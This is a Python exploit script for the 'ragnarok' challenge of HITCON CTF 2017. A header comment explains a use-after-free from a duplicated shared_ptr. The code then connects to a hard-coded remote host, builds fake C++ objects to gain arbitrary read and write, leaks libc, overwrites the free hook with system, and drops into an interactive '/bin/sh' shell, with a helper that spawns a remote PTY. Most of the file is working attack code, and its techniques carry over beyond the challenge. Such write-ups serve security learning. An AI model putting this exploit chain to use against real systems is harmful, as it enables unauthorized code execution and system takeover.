#!/usr/bin/env python3
#
# Exploit for "ragnarok" of HITCON CTF 2017.
#
# Bug:
# ----
# In Odin::add_weapon, the following line of code is executed:
#
#   cast_spell(shared_ptr<Figure>(this));
#
# This will result in a second shared_ptr for the same Object (|this|), which
# will thus be freed at the end of the function. Since the other shared_ptr is
# still in use, we get a UAF.
#
# Exploitation:
# -------------
# During set_description, if we supply a large enough string for the
# description, the heap chunk of the freed object will be used for our string
# buffer and is thus fully controlled. The function then goes on and calls
# change_desc on the now controlled object, which simply does
#
#   desc = str;
#
# where |desc| is a std::string member of the object. C++ strings in libstdc++
# have essentially the following layout:
#
# +----------------+-----------------+----------------------+
# |       ptr      |      size       |      capacity        |
# | Pointer to the | Number of bytes | Maximum capacity of  |
# | character data |     in use      | the allocated buffer |
# +----------------+-----------------+----------------------+
#
# C++ string assignment then basically works as follows:
#
# 1. If the destination capacity is greater or equal to the source size
# 2.     Then:
# 3.        Just memcpy the source buffer content to the destination buffer
# 4.     Else:
# 5.         Free the old buffer
# 6.         Allocate a new buffer and copy the source string content there
#
# Since we control the |desc| string fully (it's part of the UAF'd object), we
# can get an arbitrary (absolute) write in (3.). For that we simply set the
# pointer of the std::string to the address we wish to write and set the
# capacity to a large enough value.
#
# From there it's relatively straight forward:
#
# 1. Setup a fake Figure in the .bss using the arbitrary write (no PIE on the
# binary)
#
# 2. Corrupt the global |character| shared_ptr to point to our fake Figure
# instead
#
# 3. Construct an arbitrary read: we can still write the fake Figure in the
# .bss (through set_descr) so we can control the |weapon| std::string member.
# Since we can also read it's content (through show_figure) we can read
# arbitrary addresses.
#
# 4. Construct an arbitrary write: same as above, we simply do make_weapon
# (which does `this->weapon = str`) instead of show_info() to write controlled
# content to a controlled address
#
# 5. Leak a libc pointer from the .got and overwrite the malloc free hook in
# libc with system. Then free a chunk that starts with "/bin/sh"
#

import socket
import termios
import tty
import time
import sys
import select
import os
import re
import telnetlib
import string
from struct import pack, unpack
from binascii import hexlify, unhexlify

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#           Global Config
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#TARGET = ('localhost', 5555)
TARGET = ('13.114.157.154', 4869)

# Enable "wireshark" mode, pretty prints all incoming and outgoing network traffic.
NETDEBUG = True

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#       Encoding and Packing
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def e(d):
    """Encode the given string instance using UTF-8."""
    return d.encode('UTF-8')

def d(d):
    """Decode the given bytes instance using UTF-8."""
    return d.decode('UTF-8')

def p32(d):
    """Return d packed as 32-bit unsigned integer (little endian)."""
    return pack('<I', d)

def u32(d):
    """Return the number represented by d when interpreted as a 32-bit unsigned integer (little endian)."""
    return unpack('<I', d)[0]

def p64(d):
    """Return d packed as 64-bit unsigned integer (little endian)."""
    return pack('<Q', d)

def u64(d):
    """Return the number represented by d when interpreted as a 64-bit unsigned integer (little endian)."""
    return unpack('<Q', d)[0]

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#             Output
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def print_good(msg):
    print(ansi(Term.BOLD) + '[+] ' + msg + ansi(Term.CLEAR))

def print_bad(msg):
    print(ansi(Term.COLOR_MAGENTA) + '[-] ' + msg + ansi(Term.CLEAR))

def print_info(msg):
    print('[*] ' + msg)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#              Misc.
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def bytes_and_strings_are_cool(func):
    """Decorator to encode arguments that are string instances."""
    def inner(*args, **kwargs):
        nargs = tuple(map(lambda arg: e(arg) if isinstance(arg, str) else arg, args))
        nkwargs = dict(map(lambda k, v: (k, e(v)) if isinstance(v, str) else (k, v), kwargs))
        return func(*nargs, **nkwargs)
    return inner

def validate(data, badchars):
    """Assert that no badchar occurs in data."""
    assert(all(b not in data for b in badchars))

def is_printable(b):
    """Return true if the given byte is a printable ASCII character."""
    return b in e(string.printable)

def hexdump(data):
    """Return a hexdump of the given data. Similar to what `hexdump -C` produces."""

    def is_hexdump_printable(b):
        return b in b' 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz`~!@#$%^&*()-_=+[]{}\\|\'";:/?.,<>'

    lines = []
    chunks = (data[i*16:i*16+16] for i in range((len(data) + 15) // 16))

    for i, chunk in enumerate(chunks):
        hexblock = ['{:02x}'.format(b) for b in chunk]
        left, right = ' '.join(hexblock[:8]), ' '.join(hexblock[8:])
        asciiblock = ''.join(chr(b) if is_hexdump_printable(b) else '.' for b in chunk)
        lines.append('{:08x}  {:23}  {:23}  |{}|'.format(i*16, left, right, asciiblock))

    return '\n'.join(lines)

class Term:
    COLOR_BLACK = '30'
    COLOR_RED = '31'
    COLOR_GREEN = '32'
    COLOR_BROWN = '33'
    COLOR_BLUE = '34'
    COLOR_MAGENTA = '35'
    COLOR_CYAN = '36'
    COLOR_WHITE = '37'
    CLEAR = '0'

    UNDERLINE = '4'
    BOLD = '1'

    ESCAPE_START = '\033['
    ESCAPE_END = 'm'

# TODO rename to style and append Term.Clear ?
def ansi(*args):
    """Construct an ANSI terminal escape code."""
    code = Term.ESCAPE_START
    code += ';'.join(args)
    code += Term.ESCAPE_END
    return code

class DisconnectException(Exception):
    pass

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#        Pattern Generation
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
class Pattern:
    """De-Bruijn sequence generator."""
    alphabet = string.digits + string.ascii_letters

    def __init__(self, length):
        if length <= len(self.alphabet):
            self._seq = self.alphabet[:length]
        elif length <= len(self.alphabet) ** 2:
            self._seq = self._generate(2)[:length]
        elif length <= len(self.alphabet) ** 3:
            self._seq = self._generate(3)[:length]
        elif length <= len(self.alphabet) ** 4:
            self._seq = self._generate(4)[:length]
        else:
            raise Exception("Pattern length is way to large")

    def _generate(self, n):
        """Generate a De Bruijn sequence."""
        # See https://en.wikipedia.org/wiki/De_Bruijn_sequence

        k = len(self.alphabet)
        a = [0] * k * n
        sequence = []

        def db(t, p):
            if t > n:
                if n % p == 0:
                    sequence.extend(a[1:p + 1])
            else:
                a[t] = a[t - p]
                db(t + 1, p)
                for j in range(a[t - p] + 1, k):
                    a[t] = j
                    db(t + 1, t)
        db(1, 1)
        return ''.join(self.alphabet[i] for i in sequence)

    def bytes(self):
        """Return this sequence as bytes."""
        return e(self._seq)

    def __str__(self):
        """Return this sequence as string."""
        return self._seq

    @bytes_and_strings_are_cool
    def offset(self, needle):
        """Returns the index of 'needle' in this sequence.

        'needle' should be of type string or bytes. If an integer is provided
        it will be treated as 32-bit or 64-bit little endian number, depending
        on its bit length.
        """
        if isinstance(needle, int):
            if needle.bit_length() <= 32:
                needle = p32(needle)
            else:
                needle = p64(needle)
        needle = d(needle)

        idx = self._seq.index(needle)
        if self._seq[idx+len(needle):].find(needle) != -1:
            raise ValueError("Multiple occurances found!")

        return idx

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#             Network
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
class Channel:
    """Convenience wrapper around a socket."""
    OUTGOING_COLOR = Term.COLOR_RED
    INCOMING_COLOR = Term.COLOR_BLUE

    def __init__(self, sock, verbose):
        self._s = sock
        self._verbose = verbose
        self._buf = bytearray()

    def _prettyprint(self, data, outgoing):
        """Prettyprint the given data.

        This does the following: All data that is valid ASCII is colorized according to the direction of the traffic.
        Everything else is converted to hex, then printed in bold and underline for visibility.

        Only ASCII is supported as of now. This might be the better choice anyway since otherwise valid UTF-8 might be
        detected in arbitrary binary streams.
        """
        TEXT = 0
        BINARY = 1
        # Various Thresholds for the heuristics below
        X = 4
        Y = 16
        Z = 2


        color = self.OUTGOING_COLOR if outgoing else self.INCOMING_COLOR

        # Step 1: Tag every byte of the input stream with it's detected type.
        parts = []
        curr = ''
        for b in data:
            if is_printable(b):
                parts.append((TEXT, b))
            else:
                parts.append((BINARY, b))

        # Step 2: Merge neighboring bytes of the same type and convert the sequences to type bytes.
        i = 0
        mergedparts = []
        while i < len(parts):
            t = parts[i][0]
            arr = [parts[i][1]]
            j = i+1
            while j < len(parts) and parts[j][0] == t:
                arr.append(parts[j][1])
                j += 1
            i = j

            # Heuristic: If there are Y ASCII bytes with the same value followed by Z ASCII bytes followed by binary data, treat the Z bytes as binary as well.
            extra = []
            if t == TEXT and len(arr) > Y and i < len(parts) - 1:
                mid = len(arr) - Z - 1
                start, end = mid, mid
                char = arr[mid]
                while start >= 0 and arr[start] == char:
                    start -= 1
                while end < len(arr) and arr[end] == char:
                    end += 1

                # start and end point outside the range of equal-valued characters now.
                if end - start >= Y+2 and end < len(parts):
                    extra = arr[end:]
                    arr = arr[:end]

            mergedparts.append((t, bytes(arr)))
            if extra:
                mergedparts.append((BINARY, bytes(extra)))

        parts = mergedparts

        # Step 3: Merge all parts and prepend the ansi terminal escape sequences for the given type.
        buf = ''
        last = None
        for tag, value in parts:
            # Heuristic: If there is an ASCII sequence of X bytes or less surrounded by binary data, treat those as binary as well.
            if tag == TEXT and len(value) <= X and last == BINARY:
                tag = BINARY

            if tag == TEXT:
                buf += ansi(Term.CLEAR) + ansi(color)
            else:
                buf += ansi(color, Term.BOLD, Term.UNDERLINE)
                value = hexlify(value)

            buf += d(value)
            last = tag

        buf += ansi(Term.CLEAR)

        # Step 4: Print :)
        print(buf, end='')
        sys.stdout.flush()

    def setVerbose(self, verbose):
        """Set verbosity of this channel."""
        self._verbose = verbose

    def recv(self, n=4096):
        """Return up to n bytes of data from the remote end.

        Buffers incoming data internally.

        NOTE: You probably shouldn't be using this method. Use one of the other recvX methods instead.
        """
        if len(self._buf) < n:
            buf = self._s.recv(65536)
            if not buf and not self._buf:
                raise DisconnectException("Server disconnected.")
            if self._verbose:
                self._prettyprint(buf, False)
            self._buf += buf

        # This code also works if n > len(self._buf)
        buf = self._buf[:n]
        self._buf = self._buf[n:]
        return buf

    def recvn(self, n):
        """Return exactly n bytes of data from the remote end."""
        data = []
        while len(data) != n:
            data.append(self.recv(1))

        return b''.join(data)

    @bytes_and_strings_are_cool
    def recvtil(self, delim):
        """Read data from the remote end until delim is found in the data.

        The first occurance of delim is included in the returned buffer.
        """
        buf = b''
        # TODO maybe not make this O(n**2)...
        while not delim in buf:
            buf += self.recv(1)
        return buf

    def recvregex(self, regex):
        """Receive incoming data until it matches the given regex.

        Returns the match object.

        IMPORTANT: Since the data is coming from the network, it's usually
        a bad idea to use a regex such as 'addr: 0x([0-9a-f]+)' as this function
        will return as soon as 'addr: 0xf' is read. Instead, make sure to
        end the regex with a known sequence, e.g. use 'addr: 0x([0-9a-f]+)\\n'.
        """
        if isinstance(regex, str):
            regex = re.compile(regex)
        buf = ''
        match = None

        while not match:
            buf += d(self.recv(1))
            match = regex.search(buf)

        return match

    def recvline(self):
        """Receive and return a line from the remote end.

        The trailing newline character will be included in the returned buffer.
        """
        return self.recvtil('\n')

    def send(self, buf):
        """Send all data in buf to the remote end."""
        if self._verbose:
            self._prettyprint(buf, True)
        self._s.sendall(buf)

    def sendnum(self, n):
        """Send the string representation of n followed by a newline character."""
        self.sendline(str(n))

    @bytes_and_strings_are_cool
    def sendline(self, l):
        """Prepend a newline to l and send everything to the remote end."""
        self.send(l + b'\n')

    def interact(self):
        """Interact with the remote end: connect stdout and stdin to the socket."""
        # TODO maybe use this at some point: https://docs.python.org/3/library/selectors.html
        self._verbose = False
        try:
            while True:
                available, _, _ = select.select([sys.stdin, self._s], [], [])
                for src in available:
                    if src == sys.stdin:
                        data = sys.stdin.buffer.read1(1024)        # Only one read() call, otherwise this breaks when the tty is in raw mode
                        self.send(data)
                    else:
                        data = self.recv(4096)
                        sys.stdout.buffer.write(data)
                        sys.stdout.flush()
        except KeyboardInterrupt:
            return
        except DisconnectException:
            print_info("Server disconnected.")
            return

#
# Telnet emulation
#
def telnet(shell='/bin/bash'):
    """Telnet emulation.

    Opens a PTY on the remote end and connects the main side to the socket.
    Then spawns a shell connected to the subordinate end and puts the controlling TTY
    on the local machine into raw mode.
    Result: Something similar to a telnet/(plaintext)ssh session.

    Vim, htop, su, less, etc. will work with this.

    !!! This function only works if the channel is connected to a shell !!!
    """
    assert(sys.stdin.isatty())
    c.setVerbose(False)

    # Open a PTY and spawn a bash connected to the subordinate end on the remote side
    code = 'import pty; pty.spawn([\'{}\', \'-i\'])'.format(shell)
    sendline('python -c "{}"; exit'.format(code))
    time.sleep(0.5)           # No really good way of knowing when the shell has opened on the other side...
                              # Should maybe put some more functionality into the inline python code instead.

    # Save current TTY settings
    old_settings = termios.tcgetattr(sys.stdin.fileno())

    # Put TTY into raw mode
    tty.setraw(sys.stdin)

    # Resize remote terminal
    # Nice-to-have: also handle terminal resize
    cols, rows = os.get_terminal_size(sys.stdin.fileno())
    sendline('stty rows {} cols {}; echo READY'.format(rows, cols))
    recvtil('READY\r\n')            # terminal echo
    recvtil('READY\r\n')            # command output

    interact()

    # Restore previous settings
    termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old_settings)

#
# Convenience wrappers that use the global socket instance
#
def send(b):
    c.send(b)

def sendline(l):
    c.sendline(l)

def sendnum(n):
    c.sendnum(n)

def recv(n):
    return c.recv(n)

def recvtil(delim):
    return c.recvtil(delim)

def recvn(n):
    return c.recvn(n)

def recvline():
    return c.recvline()

def recvregex(r):
    return c.recvregex(r)

def interact():
    c.interact()

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#          Global Setup
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
s = socket.create_connection(TARGET)
s.settimeout(30)
c = Channel(s, NETDEBUG)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#         Your code here
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ODIN = 1
THOR = 2
FREYR = 3

vtab_thor = 0x40C6C8
vtab_odin = 0x40C700
vtab_freyr = 0x40C690
vtab_figure = 0x40C738

character_addr = 0x613650
fake_odin = 0x613c00

def choose_figure(n):
    sendnum(1)
    recvtil('Choose your figure :')
    sendnum(n)
    recvtil('Your choice :')

def show_info():
    sendnum(2)
    return recvtil('Your choice :')

def earn_money(n):
    char_matchers = {
            'h': re.compile("^    \S     \S      "),
            'i': re.compile("^     \S\S\S     "),
            't': re.compile("^   \S\S\S\S\S\S\S    "),
            'c': re.compile("^     \S\S\S\S     \n    \S     "),
            'o': re.compile("^    \S\S\S\S     \n    \S    \S "),
            'n': re.compile("^   \S    \S    ")
    }
    sendnum(3)
    recvtil('***************************\n')
    for i in range(n):
        char = recvtil('***************************')
        print(char)
        for c, p in char_matchers.items():
            if p.match(d(char)):
                sendline(c)
                break
        recvtil('***************************\n')
    sendline('q')
    recvtil('Your choice :')

def set_weapon(name):
    sendnum(4)
    l = recvline()
    if b"Name" in recv(5):
        sendline(name)
    recvtil('Your choice :')

def fight():
    sendnum(5)
    recvtil('Name : ')
    if b'Jormungandr' in recvline():
        print("Please retry")
        sys.exit(-1)

    while True:
        recvtil('Your choice :')
        sendnum(1)      # Always attack
        while True:
            l = recvline()
            if b'You died' in l:
                sendnum(1)
                recvtil('Your choice :')
                return False
            elif b'You win' in l:
                recvline()
                if b'Record your score' in recvline():
                    if b'Name' in recv(5):
                        sendline('saelo')
                recvtil('Your choice :')
                return True
            elif b'=============' in l:
                break

def set_descr(descr):
    sendnum(6)
    sendline(descr)
    recvtil('Your choice :')

def fake_str(ptr, size):
    return p64(ptr) + p64(size) + p64(size) + p64(0)

def make_fake_odin():
    descr = p64(vtab_odin)              # vtable (must be valid due to https://gcc.gnu.org/wiki/vtv)
    descr += b"\x00" * 32               # name
    descr += fake_str(fake_odin, 0x100) # description (will be assigned, thus we get an arbitrary write)
    descr += b"\x00" * 32               # weapon
    descr += p64(0x13371337)            # atk
    descr += p64(0x13371337)            # hp
    set_descr(descr)

def use_fake_odin():
    descr = p64(fake_odin)              # shared_ptr pointer
    descr += p64(0x613680)              # shared_ptr refcount
    descr += p64(fake_odin)             # name.0
    descr += p64(0x10)                  # name.1
    descr += p64(0)                     # name.2
    descr += fake_str(character_addr, 0x7777777777777777)
    descr += b"\x00" * 32               # weapon
    descr += p64(0x13371337)            # money
    descr += p64(0x13371337)            # highscore
    set_descr(descr)

def set_weapon_string(addr, length):
    validate(p64(addr), [0x20, 0x0a, 0xb])
    descr = p64(vtab_figure)            # vtable
    descr += b"\x00" * 32               # name
    descr += fake_str(fake_odin, 0x100) # description (always need this to point to |this|)
    descr += fake_str(addr, length)     # weapon
    descr += p64(0x13371337)            # atk
    descr += p64(0x13371337)            # hp
    set_descr(descr)

def read_weapon(length):
    info = show_info()
    idx = info.index(b'Weapon') + 9
    return info[idx:idx+length]

def read_mem(addr, length):
    set_weapon_string(addr, length)
    return read_weapon(length)

def read_ptr(addr):
    return u64(read_mem(addr, 8))

def write_mem(addr, data):
    set_weapon_string(addr, len(data) + 0x10)
    set_weapon(data)

def pwn():
    recvtil('Your choice :')

    # Need to win first to get enough money for a weapon
    won = False
    while not won:
        choose_figure(THOR)
        earn_money(3)
        won = fight()

    # Need to die again to select a new character
    while won:
        won = fight()

    # Only Odin triggers the UAF
    choose_figure(ODIN)

    # Trigger the UAF. After this, our character will have been freed but is
    # still in use
    set_weapon('Gungnir')

    # Abuse arbitrary (absolute write) to construct a fake character in the
    # .bss and use that instead of the freed one
    make_fake_odin()
    use_fake_odin()

    # Leak the libc from .got
    free = read_ptr(0x610F30)
    libc = free - 0x8f390
    print("libc @ 0x{:x}".format(libc))

    # Replace the free hook with system()
    system = libc + 0x47dc0
    free_hook = libc + 0x3dc8a8
    write_mem(free_hook, p64(system))

    # Free a chunk that start with "/bin/sh"
    # set the write pointer to a harmless address
    write_mem(fake_odin + 0x100, b'AAAAAAAA')
    # add_weapon()
    sendnum(4)
    recvtil('Name of your weapon :')
    # small strings are stored inline in the std::string object and thus won't
    # cause a heap allocation
    sendline('/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00')
    print("Enjoy your shell :)")

    interact()

if __name__ == '__main__':
    pwn()